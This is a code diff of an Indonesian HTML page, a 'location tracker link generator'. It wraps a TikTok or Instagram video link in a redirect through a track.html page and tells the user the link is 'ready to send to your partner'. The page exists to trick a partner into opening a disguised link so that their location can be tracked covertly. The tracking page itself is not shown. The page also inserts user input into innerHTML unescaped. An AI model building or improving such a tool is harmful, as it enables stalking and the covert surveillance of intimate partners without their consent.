@@ -1,16 +1,40 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Generator Link Pelacak</title>
+  <title>Generator Link Pelacak Lokasi</title>
   <style>
-    body { font-family: Arial; padding: 20px; max-width: 600px; margin: auto; }
-    input, button { padding: 10px; width: 100%; margin-top: 10px; }
+    body {
+      font-family: Arial, sans-serif;
+      padding: 20px;
+      max-width: 600px;
+      margin: auto;
+      background: #f9f9f9;
+    }
+    input, button {
+      padding: 10px;
+      width: 100%;
+      margin-top: 10px;
+      font-size: 16px;
+    }
+    button {
+      background: #4CAF50;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #45a049;
+    }
+    a {
+      word-break: break-all;
+      color: #007bff;
+    }
   </style>
 </head>
 <body>
   <h2>🔗 Generator Link Pelacak Lokasi</h2>
-  <p>Masukkan link video TikTok/Instagram yang ingin kamu kirim:</p>
-  <input type="text" id="inputLink" placeholder="https://www.tiktok.com/..." />
+  <p>Masukkan link video TikTok atau Instagram yang ingin kamu kirim:</p>
+  <input type="text" id="inputLink" placeholder="https://www.tiktok.com/@user/video/..." />
   <button onclick="generate()">🎯 Buat Link Pelacak</button>
 
   <p id="outputLink" style="margin-top:20px; font-weight: bold;"></p>
@@ -19,16 +43,16 @@
     function generate() {
       const originalUrl = document.getElementById("inputLink").value.trim();
       if (!originalUrl) {
-        alert("Masukkan link dulu dong!");
+        alert("Masukkan link videonya dulu!");
         return;
       }
 
-      // Encode URL video agar bisa disisipkan di link pelacak
       const encodedUrl = encodeURIComponent(originalUrl);
-      const trackingUrl = `https://your-domain.com/track.html?redirect=${encodedUrl}`;
+      const domain = window.location.origin;
+      const trackingUrl = `${domain}/track.html?redirect=${encodedUrl}`;
 
       document.getElementById("outputLink").innerHTML =
-        `Link siap kirim: <br><a href="${trackingUrl}" target="_blank">${trackingUrl}</a>`;
+        `Link siap dikirim ke pasangan kamu: <br><a href="${trackingUrl}" target="_blank">${trackingUrl}</a>`;
     }
   </script>
 </body>
